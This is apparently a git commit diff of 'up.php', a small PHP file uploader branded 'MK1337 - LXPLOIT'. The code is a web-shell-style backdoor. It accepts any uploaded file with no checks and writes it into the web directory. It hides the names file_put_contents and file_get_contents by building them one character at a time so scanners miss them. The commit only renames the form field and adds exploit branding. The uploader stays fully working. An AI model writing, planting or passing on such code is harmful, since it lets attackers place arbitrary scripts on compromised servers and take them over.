50fe5c4d5f0bba4b0c30395e51672746f69c0267
MataKucing - MK1337 <72303820+MataKucing-OFC@users.noreply.github.com>
2023-03-15 14:20:00 +0700

    Update up.php

--- up.php
+++ up.php
@@ -1,9 +1,10 @@
-<form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button>Gaskan</button></form>
+<h1>MK1337 - LXPLOIT</h1>
+<form method="post" enctype="multipart/form-data"><input type="file" name="mk1337"><button>EXPLOIT</button></form>
 <?php
 echo base64_decode("TUsxMzM3");
 $a = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
 $b = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
 $c = "t"."m"."p"."_"."n"."a"."m"."e";
-if (isset($_FILES['uk45'])) {$a($_FILES['uk45']['name'], $b($_FILES['uk45'][$c]));if (file_exists("./".$_FILES['uk45']['name'])) {echo "Oke !";} else {echo "Fail !";}}
+if (isset($_FILES['mk1337'])) {$a($_FILES['mk1337']['name'], $b($_FILES['mk1337'][$c]));if (file_exists("./".$_FILES['mk1337']['name'])) {echo "Done !";} else {echo "Fail !";}}
 ?>
 
